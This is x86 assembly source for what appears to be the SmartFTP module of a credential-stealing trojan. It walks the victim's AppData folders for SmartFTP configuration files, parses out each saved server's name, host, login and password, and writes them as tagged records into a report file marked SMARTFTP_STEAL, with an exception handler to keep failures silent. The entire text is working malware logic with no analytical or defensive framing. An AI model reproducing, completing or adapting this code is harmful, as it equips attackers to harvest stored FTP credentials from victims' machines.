     
.data?
     smart_AppData      db 200h dup (?)
     smart_Host         db 100h dup (?)
     smart_User         db 100h dup (?)
     smart_Pass         db 100h dup (?)
     smart_Name         db 100h dup (?)
     
.code

SmartFTPRecCallback proc lpPath:DWORD, lpFilename:DWORD
      push    lpPath
      call    _PathFindFileName
      mov     byte ptr [eax], 0
      lstrcat, lpPath, lpFilename
      
      push    dword ptr [lpPath]
      call    ProcessSmartFTPFile
      
    sf_mapping_error:
      ret
SmartFTPRecCallback endp

GetSmartFTPPwd proc
      LOCAL   WTF:DWORD
      LOCAL   hFind :DWORD
      
      mov     dword ptr [DataSize], 0
      mov     dword ptr [stbuf], SMARTFTP_STEAL
      WriteFile, stfile, addr stbuf, sizeof stbuf, addr SNW, NULL
      
      push    offset stealer_seh_proc
      assume  fs : nothing
      push    dword ptr fs:[0]
      mov     dword ptr fs:[0], esp
      mov     eax, offset GetSmartFTPPwd_seh
      mov     seh.SafeEip, eax
      mov     seh.PrevEbp, ebp
      mov     seh.PrevEsp, esp
      SetFilePointer, stfile, 0, 0, FILE_CURRENT
      mov     dword ptr [savedfilepointer], eax
      ; appdata shit #1
      push    0
      push    CSIDL_APPDATA
      push    offset smart_AppData
      push    0
      call    _SHGetSpecialFolderPath
      push    offset smart_AppData
      call    dword ptr [_PathAddBackslash]
      lstrcat, addr smart_AppData, addr smart_path1
      mov     recursive_index, 0
      push    offset SmartFTPRecCallback
      push    offset smart_AppData
      call    SomeRecursiveFunc
      ; appdata shit #2
      push    0
      push    CSIDL_COMMON_APPDATA
      push    offset smart_AppData
      push    0
      call    _SHGetSpecialFolderPath
      push    offset smart_AppData
      call    dword ptr [_PathAddBackslash]
      lstrcat, addr smart_AppData, addr smart_path1
      mov     recursive_index, 0
      push    offset SmartFTPRecCallback
      push    offset smart_AppData
      call    SomeRecursiveFunc
      ; appdata shit #3
      push    0
      push    CSIDL_LOCAL_APPDATA
      push    offset smart_AppData
      push    0
      call    _SHGetSpecialFolderPath
      push    offset smart_AppData
      call    dword ptr [_PathAddBackslash]
      lstrcat, addr smart_AppData, addr smart_path1
      mov     recursive_index, 0
      push    offset SmartFTPRecCallback
      push    offset smart_AppData
      call    SomeRecursiveFunc
      
    GetSmartFTPPwd_seh:
      pop     dword ptr fs:[0]
      add     esp, 4
      
      WriteFile, stfile, addr DataSize, sizeof DataSize, addr SNW, NULL
      mov     eax, dword ptr [DataSize] ; return actual size of written data
      ret
GetSmartFTPPwd endp

ProcessSmartFTPFile proc lpPath:DWORD
      LOCAL   pbegin   :DWORD
      LOCAL   pend     :DWORD
      LOCAL   gbegin   :DWORD
      
      invoke  MapFile, lpPath, addr mfile, MAP_FILE_A
      test    eax, eax
      je      smart_shit_bricks
      
      mov      ebx, dword ptr [mfile.lpMem]
    smart_parse_lp:
      
      lstrlen, ebx
      push    eax
      lstrlen, addr smartserver1
      push    eax
      push    ebx
      push    offset smartserver1
      call    strpos
      test    eax, eax
      je      skip_current_server
      add     eax, sizeof smartserver1-1
      mov     dword ptr [gbegin], eax
      lstrlen, gbegin
      push    eax
      lstrlen, addr smartserver2
      push    eax
      push    dword ptr [gbegin]
      push    offset smartserver2
      call    strpos
      test    eax, eax
      je      skip_current_server
      mov     ebx, eax
      add     ebx, sizeof smartserver2-1
      sub     eax, dword ptr [gbegin]
      add     eax, 1
      lstrcpyn, addr smart_Name, gbegin, eax
      
      lstrlen, ebx
      push    eax
      lstrlen, addr smartserver3
      push    eax
      push    ebx
      push    offset smartserver3
      call    strpos
      test    eax, eax
      je      skip_current_server
      add     eax, sizeof smartserver3-1
      mov     dword ptr [gbegin], eax
      lstrlen, gbegin
      push    eax
      lstrlen, addr smartserver4
      push    eax
      push    dword ptr [gbegin]
      push    offset smartserver4
      call    strpos
      test    eax, eax
      je      skip_current_server
      mov     ebx, eax
      add     ebx, sizeof smartserver4-1
      sub     eax, dword ptr [gbegin]
      add     eax, 1
      lstrcpyn, addr smart_Host, gbegin, eax
      
      lstrlen, ebx
      push    eax
      lstrlen, addr smartserver5
      push    eax
      push    ebx
      push    offset smartserver5
      call    strpos
      test    eax, eax
      je      skip_current_server
      add     eax, sizeof smartserver5-1
      mov     dword ptr [gbegin], eax
      lstrlen, gbegin
      push    eax
      lstrlen, addr smartserver6
      push    eax
      push    dword ptr [gbegin]
      push    offset smartserver6
      call    strpos
      test    eax, eax
      je      skip_current_server
      mov     ebx, eax
      add     ebx, sizeof smartserver6-1
      sub     eax, dword ptr [gbegin]
      add     eax, 1
      lstrcpyn, addr smart_User, gbegin, eax
      
      lstrlen, ebx
      push    eax
      lstrlen, addr smartserver7
      push    eax
      push    ebx
      push    offset smartserver7
      call    strpos
      test    eax, eax
      je      skip_current_server
      add     eax, sizeof smartserver7-1
      mov     dword ptr [gbegin], eax
      lstrlen, gbegin
      push    eax
      lstrlen, addr smartserver8
      push    eax
      push    dword ptr [gbegin]
      push    offset smartserver8
      call    strpos
      test    eax, eax
      je      skip_current_server
      mov     ebx, eax
      add     ebx, sizeof smartserver8-1
      sub     eax, dword ptr [gbegin]
      add     eax, 1
      lstrcpyn, addr smart_Pass, gbegin, eax
      
      lstrlen, addr smart_Name
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_NAME
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr smart_Name, plen, addr SNW, NULL
      
      lstrlen, addr smart_Host
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_HOST
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr smart_Host, plen, addr SNW, NULL
      
      lstrlen, addr smart_User
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_LOGIN
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr smart_User, plen, addr SNW, NULL
      
      lstrlen, addr smart_Pass
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_PWD
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr smart_Pass, plen, addr SNW, NULL
      
    skip_current_server:
      cmp     ebx, dword ptr [mfile.dwFileSize]
      jle     smart_parse_lp
      
    no_pwds_here:
      invoke  UnmapFile, addr mfile
    smart_shit_bricks:
      ret
ProcessSmartFTPFile endp
